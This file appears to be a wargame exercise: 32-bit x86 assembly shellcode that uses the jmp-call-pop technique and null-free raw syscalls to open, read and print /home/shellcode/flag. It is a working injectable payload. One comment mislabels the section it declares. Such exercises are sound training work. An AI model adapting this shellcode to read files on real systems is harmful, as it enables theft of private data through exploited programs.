BITS 32

section  .data              ; declaring our .text segment
  global  _start            ; telling where program execution should start

_start:                     ; this is where code starts getting exec'ed
    jmp ed

st:
    xor   eax, eax
    xor   edx, edx
    ; open /home/shellcode/flag
    pop   ebx            ; pop string's address to ebx 
    mov   [ebx+0x14], al ; add null byte 
    mov   al,0x5         ; open(
    xor   ecx, ecx       ; O_RDONLY
    int   0x80           ; );

    ; read /home/shellcode/flag to a buffer
    mov   ebx,eax       ;   file_descriptor,
    mov   al,0x3        ; read(
    sub   esp,0x50      ;   allocate a space for buffer  
    push  esp           ;   push buffer's address to stack
    pop   ecx           ;   *buf,
    mov   dl,0x50       ;   *bufsize
    int   0x80          ; );

    ; write to STDOUT
    mov   edx, eax      ; edx = len = read's return value 
    mov   al,0x4        ; write(
    mov   bl,0x1        ;   STDOUT,
    int   0x80          ; );

    ; exit(0)
    mov   al, 0x1       ; exit(
    xor   ebx, ebx       ;   0
    int   0x80          ; );

ed:
    call st
    db '/home/shellcode/flag'
